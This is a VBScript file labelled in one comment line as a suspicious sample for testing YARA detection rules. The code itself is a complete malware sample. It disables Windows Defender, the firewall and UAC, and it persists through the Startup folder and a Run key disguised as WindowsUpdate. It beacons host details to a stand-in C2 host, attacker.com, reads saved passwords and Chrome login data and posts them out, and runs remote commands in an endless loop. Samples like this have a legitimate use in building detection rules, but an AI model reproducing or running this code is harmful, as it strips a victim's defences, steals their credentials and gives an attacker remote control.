' Suspicious VBScript for testing YARA rules
Set objWMI = GetObject("winmgmts:")
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' C2 Configuration
C2_HOST = "attacker.com"
C2_PORT = 443

Sub InitializeBeacon()
    Dim xmlHttp
    Set xmlHttp = CreateObject("MSXML2.XMLHTTP")

    Dim sysInfo
    sysInfo = "computer=" & objShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & "&user=" & objShell.ExpandEnvironmentStrings("%USERNAME%")

    xmlHttp.Open "POST", "https://" & C2_HOST & ":" & C2_PORT & "/beacon", False
    xmlHttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    xmlHttp.Send sysInfo
End Sub

Sub DisableSecurityFeatures()
    ' Disable Windows Defender
    objShell.Run "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true", 0, True

    ' Disable Windows Firewall
    objShell.Run "netsh advfirewall set allprofiles state off", 0, True

    ' Disable User Account Control
    Const HKEY_LOCAL_MACHINE = &H80000002
    Set objReg = GetObject("winmgmts:").ExecMethod("StdRegProv")
    objReg.SetDWORDValue HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", 0
End Sub

Sub AchievePersistence()
    Dim startup_folder
    startup_folder = objShell.SpecialFolders("Startup")

    Dim malware_copy
    malware_copy = startup_folder & "\WindowsUpdate.vbs"

    If Not objFSO.FileExists(malware_copy) Then
        objFSO.CopyFile WScript.ScriptFullName, malware_copy
    End If

    ' Registry persistence
    objShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", WScript.ScriptFullName
End Sub

Sub StealCredentials()
    Dim cred_file, file_path

    Dim files_to_steal
    files_to_steal = Array("Desktop\passwords.txt", "Documents\login.xlsx", "AppData\Local\Google\Chrome\User Data\Default\Login Data")

    Dim user_profile
    user_profile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")

    For Each file_path In files_to_steal
        Dim full_path
        full_path = user_profile & "\" & file_path

        If objFSO.FileExists(full_path) Then
            Dim creds
            Set creds = objFSO.OpenTextFile(full_path, 1)
            Dim content
            content = creds.ReadAll()
            creds.Close()

            ExfiltrateData content, file_path
        End If
    Next
End Sub

Sub ExfiltrateData(data, filename)
    Dim xmlHttp
    Set xmlHttp = CreateObject("MSXML2.XMLHTTP")

    xmlHttp.Open "POST", "https://" & C2_HOST & ":" & C2_PORT & "/exfil", False
    xmlHttp.SetRequestHeader "Content-Type", "text/plain"
    xmlHttp.Send data

    xmlHttp.Open "POST", "https://" & C2_HOST & ":" & C2_PORT & "/log", False
    xmlHttp.Send "Exfiltrated: " & filename
End Sub

Sub CommandAndControl()
    Do While True
        Dim xmlHttp
        Set xmlHttp = CreateObject("MSXML2.XMLHTTP")

        xmlHttp.Open "GET", "https://" & C2_HOST & ":" & C2_PORT & "/command", False
        xmlHttp.Send

        If xmlHttp.Status = 200 Then
            Dim command
            command = xmlHttp.ResponseText

            If Len(command) > 0 Then
                objShell.Run "cmd.exe /c " & command, 0, True
            End If
        End If

        WScript.Sleep 30000
    Loop
End Sub

' Main execution
DisableSecurityFeatures()
AchievePersistence()
InitializeBeacon()
StealCredentials()
CommandAndControl()